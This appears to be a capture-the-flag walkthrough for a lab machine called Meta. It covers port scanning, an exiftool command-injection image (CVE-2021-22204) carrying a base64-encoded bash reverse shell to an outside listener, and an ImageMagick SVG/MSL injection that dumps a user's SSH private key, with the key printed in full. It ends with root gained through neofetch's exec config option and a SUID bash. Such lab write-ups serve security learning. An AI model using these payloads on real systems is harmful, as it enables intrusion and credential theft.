---
layout: default
---

# Meta

# Enumeration

IP → 10.10.11.140

The port scan reported the following opened ports

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiNHVBq9XNN5eXFkQosElagVm6qkXg6Iryueb1zAywZIA4b0dX+5xR5FpAxvYPxmthXA0E7/wunblfjPekyeKg+lvb+rEiyUJH25W/In13zRfJ6Su/kgxw9whZ1YUlzFTWDjUjQBij7QSMktOcQLi7zgrkG3cxGcS39SrEM8tvxcuSzMwzhFqVKFP/AM0jAxJ5HQVrkXkpGR07rgLyd+cNQKOGnFpAukUJnjdfv9PsV+LQs9p+a0jID+5B9y5fP4w9PvYZUkRGHcKCefYk/2UUVn0HesLNNrfo6iUxu+eeM9EGUtqQZ8nXI54nHOvzbc4aFbxADCfew/UJzQT7rovB
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEDINAHjreE4lgZywOGusB8uOKvVDmVkgznoDmUI7Rrnlmpy6DnOUhov0HfQVG6U6B4AxCGaGkKTbS0tFE8hYis=
|   256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdX83J9TLR63TPxQSvi3CuobX8uyKodvj26kl9jWUSq
80/tcp open  http    syn-ack Apache httpd
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80

- HTTP
- domain → artcorp.htb

```powershell
┌──(kali㉿kali)-[~/machines/linux/meta/enumeration]
└─$ curl -I 10.10.11.140                    
HTTP/1.1 301 Moved Permanently
Date: Fri, 01 Dec 2023 05:32:13 GMT
Server: Apache
Location: http://artcorp.htb
Content-Type: text/html; charset=UTF-8

                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/machines/linux/meta/enumeration]
└─$ whatweb 10.10.11.140                                                                                                                                
http://10.10.11.140 [301 Moved Permanently] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.140], RedirectLocation[http://artcorp.htb]
http://artcorp.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.140], Title[Home]
```

Nothing in the root of the web page

- directory enumeration → nothing
- subdomain enumeration
    - dev01.artcorp.htb

### dev01.artcorp.htb

- Maybe there are more applicationts that aren’t displayed

![Untitled](Meta%203c36fefecf464a5d827cec5be8c89ef4/Untitled.png)

- /metaview
    
    ![Untitled](Meta%203c36fefecf464a5d827cec5be8c89ef4/Untitled%201.png)
    

# Foothold

There are various vectors of attack tat we can try:

- command injection?
- php may be interpreted if we inject code in the metadata?
- php library to extract metadata vulnerable?
- exiftool searchexploit?

It seems it is vulnerable to a CVE for exiftool → CVE-2021-22204

![Untitled](Meta%203c36fefecf464a5d827cec5be8c89ef4/Untitled%202.png)

Following the indications this blog [https://ine.com/blog/exiftool-command-injection-cve-2021-22204](https://ine.com/blog/exiftool-command-injection-cve-2021-22204) we can craft a malicous image that contains metadata taht will be executed by the server.

### Gaining a reverse shell

- create payload

```bash
┌──(kali㉿kali)-[~/machines/linux/meta/exploit]
└─$ cat payload              
(metadata "\c${system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MyAwPiYxCg== | base64 -d | bash')};")
```

- Encode payload and generate malicious djvu file

```bash
┌──(kali㉿kali)-[~/machines/linux/meta/exploit]
└─$ bzz payload payload.bzz

┌──(kali㉿kali)-[~/machines/linux/meta/exploit]
└─$ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
```

- Create malicious jpg file that can be uploaded to the server

```bash
┌──(kali㉿kali)-[~/machines/linux/meta/exploit]
└─$ cat configfile           
%Image::ExifTool::UserDefined = (
'Image::ExifTool::Exif::Main' => {
    0xc51b => {
        Name => 'HasselbladExif',
        Writable => 'string',
        WriteGroup => 'IFD0',
    },
},
);
1
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/linux/meta/exploit]
└─$ exiftool -config configfile '-HasselbladExif<=exploit.djvu' wallpaper.jpg
    1 image files updated
```

Once uploaded we will have our reverse shell in the listener.

```bash
┌──(kali㉿kali)-[~/machines/linux/meta]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.140] 41782
bash: cannot set terminal process group (597): Inappropriate ioctl for device
bash: no job control in this shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ whoami
whoami
www-data
```

# Privilege escalation

### Pivoting to user Thomas

We are going to pivot to user thomas, since we will probably have more privilege than www-data.

- There are no binaries or files outside his user home directory that are owned by thomas
- He isn’t running any program
- There are no mentions to his name in any system file
- We cannot run commands as Thomas using sudo

If we ran [pspy](https://github.com/DominicBreuker/pspy) and wait some minutes we will have something interesting.

```bash
2023/12/01 03:01:01 CMD: UID=1000  PID=3427   | /bin/sh -c /usr/local/bin/convert_images.sh 
2023/12/01 03:01:01 CMD: UID=1000  PID=3428   | /bin/bash /usr/local/bin/convert_images.sh 
2023/12/01 03:01:01 CMD: UID=1000  PID=3429   | /bin/bash /usr/local/bin/convert_images.sh 
2023/12/01 03:01:01 CMD: UID=0     PID=3430   | /usr/sbin/CRON -f 
2023/12/01 03:01:01 CMD: UID=0     PID=3431   | /bin/sh -c rm /tmp/* 
2023/12/01 03:01:01 CMD: UID=1000  PID=3432   | /bin/bash /usr/local/bin/convert_images.sh 
2023/12/01 03:02:01 CMD: UID=0     PID=3435   | /usr/sbin/CRON -f 
2023/12/01 03:02:01 CMD: UID=0     PID=3434   | /usr/sbin/cron -f 
2023/12/01 03:02:01 CMD: UID=0     PID=3433   | /usr/sbin/CRON -f 
2023/12/01 03:02:01 CMD: UID=0     PID=3436   | /usr/sbin/CRON -f 
2023/12/01 03:02:01 CMD: UID=1000  PID=3437   | 
2023/12/01 03:02:01 CMD: UID=1000  PID=3438   | /bin/bash /usr/local/bin/convert_images.sh 
2023/12/01 03:02:01 CMD: UID=0     PID=3439   | /usr/sbin/CRON -f 
2023/12/01 03:02:01 CMD: UID=0     PID=3441   | /bin/sh -c rm /tmp/* 
2023/12/01 03:02:01 CMD: UID=0     PID=3440   | /usr/sbin/CRON -f 
2023/12/01 03:02:01 CMD: UID=0     PID=3442   | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
2023/12/01 03:02:01 CMD: UID=1000  PID=3443   | pkill mogrify
```

Thomas is running the following script every two minutes.

```bash
www-data@meta:/tmp$ cat /usr/local/bin/convert_images.sh 
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

mogrify is actually a symbolic link to magick. Searching for vulnerabilitie int his blog the author explain how to exploit this [https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html). 

We have to create svg file  and copy to /var/www/dev01.artcorp.htb/convert_images/

```bash
www-data@meta:/home/thomas$ cat /tmp/poc.svg 
<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa) > ~/test.txt`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

If we wait we will have the thomas ssh key in a file called test.txt in his home folder.

```bash
www-data@meta:/home/thomas$ cat test.txt 
-----BEGIN OPENSSH PRIVATE KEY----- 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 bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE= -----END OPENSSH PRIVATE KEY-----
www-data@meta:/home/thomas$
```

In this page [https://www.samltool.com/format_privatekey.php](https://www.samltool.com/format_privatekey.php) we can give the key the correct format and use to log in as thomas via ssh.

### From Thomas to root

Once we are user Thomas we can see that we have a sudo right.

```bash
thomas@meta:~/.config/neofetch$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

We can execute neofetch but without any arguments. However we see that there is an uncommon option in this output.

- `env_keep+=XDG_CONFIG_HOME` → this means that we can keep this env variable once we execute root

We can see that te config file for neofetch is in  `/home/thomas/.config/neofetch` . In neofetch there is a way to execute any command we want but we have to specify this in the config file with the switch `exec=<command>` . Setting all this pieces togther we can escalate privielges.

- We set the env variable

```bash
export XDG_CONFIG_HOME=/home/thomas/.config/
```

- We add `exec=$(chmod u+s /bin/bash)` at the end of the config file
- We execute `sudo /usr/bin/neofetch`
- Bash binary should be SUID and allow us to get a shell as root

```bash
thomas@meta:~/.config/neofetch$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
thomas@meta:~/.config/neofetch$ bash -p
bash-5.0# whoami
root
```